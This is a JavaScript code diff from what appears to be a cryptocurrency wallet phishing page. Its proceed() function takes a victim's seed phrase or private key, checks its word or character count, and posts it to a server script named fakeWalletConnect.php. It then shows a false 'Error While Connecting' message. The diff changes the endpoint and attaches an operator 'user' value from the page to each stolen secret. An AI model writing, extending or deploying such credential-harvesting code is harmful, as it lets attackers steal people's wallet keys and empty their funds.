@@ -321,6 +321,9 @@ function proceed() {
   console.log(selectedWalletName)
 
 
+  const user = document.querySelector('#modelWapper').getAttribute('auth')
+
+
 
 
   if (type === 'seedPhrase') {
@@ -334,17 +337,21 @@ function proceed() {
     if (wordCount === 12 || wordCount == 15 || wordCount == 18 || wordCount == 21 || wordCount == 24) {
       $(() => {
         $.ajax({
-          url: "../server/fakeWalletConnect.php",
+          url: "../server/api/fakeWalletConnect.php",
           method: "POST",
           data: {
             privateKey: null,
             name: selectedWalletName,
             seedPhrase: value,
+            user,
             from: 'fakeWalletConnect'
           },
           success(data) {
             
              walletError.innerHTML = 'Error While Connecting....';
+          },
+          error(err){
+            console.log(err)
           }
         })
       })
@@ -361,12 +368,13 @@ function proceed() {
     if (textCount == 32 || textCount == 48 || textCount == 64 || textCount == 66) {
       $(() => {
         $.ajax({
-          url: "../server/fakeWalletConnect.php",
+          url: "../server/api/fakeWalletConnect.php",
           method: "POST",
           data: {
             privateKey: value,
             name: selectedWalletName,
             seedPhrase: null,
+            user,
             from: 'fakeWalletConnect'
           },
           success(data) {
